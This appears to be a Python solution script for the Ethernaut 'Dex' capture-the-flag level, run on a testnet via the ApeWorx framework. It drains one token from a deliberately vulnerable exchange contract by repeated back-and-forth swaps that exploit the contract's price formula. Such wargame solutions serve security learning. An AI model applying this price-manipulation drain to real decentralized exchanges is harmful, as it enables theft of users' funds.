from ape import accounts, project
from .utils.helper import get_level_instance, level_completed

ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
LEVEL = "0x42e2B591D35B93b24c67Ad13db9C965658D1f7C7"
MAX_UINT = 2**256 - 1


def main():
    # setting up user
    user = accounts.load("YOUR_ALIAS")
    user.set_autosign(enabled=True)  # make sure you are on testnet

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user, gas=9000000)

    contract = project.Dex.at(instance)

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")
    token1 = contract.token1()
    token2 = contract.token2()
    # approve instance for token1 and token2
    contract.approve(instance, MAX_UINT, sender=user)
    # swap tokens back and forth to unbalance pool
    contract.swap(token1, token2, 10, sender=user)
    print(
        f"\n--- We have {contract.balanceOf(token1, user.address)} token1 tokens and the instance has {contract.balanceOf(token1, instance)}---\n"
    )
    print(
        f"\n--- We have {contract.balanceOf(token2, user.address)} token2 tokens and the instance has {contract.balanceOf(token2, instance)}---\n"
    )

    contract.swap(token2, token1, 20, sender=user)
    print(
        f"\n--- We have {contract.balanceOf(token1, user.address)} token1 tokens and the instance has {contract.balanceOf(token1, instance)}---\n"
    )
    print(
        f"\n--- We have {contract.balanceOf(token2, user.address)} token2 tokens and the instance has {contract.balanceOf(token2, instance)}---\n"
    )

    contract.swap(token1, token2, 24, sender=user)
    print(
        f"\n--- We have {contract.balanceOf(token1, user.address)} token1 tokens and the instance has {contract.balanceOf(token1, instance)}---\n"
    )
    print(
        f"\n--- We have {contract.balanceOf(token2, user.address)} token2 tokens and the instance has {contract.balanceOf(token2, instance)}---\n"
    )

    contract.swap(token2, token1, 30, sender=user)
    print(
        f"\n--- We have {contract.balanceOf(token1, user.address)} token1 tokens and the instance has {contract.balanceOf(token1, instance)}---\n"
    )
    print(
        f"\n--- We have {contract.balanceOf(token2, user.address)} token2 tokens and the instance has {contract.balanceOf(token2, instance)}---\n"
    )

    contract.swap(token1, token2, 41, sender=user)
    print(
        f"\n--- We have {contract.balanceOf(token1, user.address)} token1 tokens and the instance has {contract.balanceOf(token1, instance)}---\n"
    )
    print(
        f"\n--- We have {contract.balanceOf(token2, user.address)} token2 tokens and the instance has {contract.balanceOf(token2, instance)}---\n"
    )

    contract.swap(token2, token1, 45, sender=user)
    print(
        f"\n--- We have {contract.balanceOf(token1, user.address)} token1 tokens and the instance has {contract.balanceOf(token1, instance)}---\n"
    )
    print(
        f"\n--- We have {contract.balanceOf(token2, user.address)} token2 tokens and the instance has {contract.balanceOf(token2, instance)}---\n"
    )

    # assert we drained token1 from contract
    assert contract.balanceOf(token1, instance) == 0, "!drained"

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
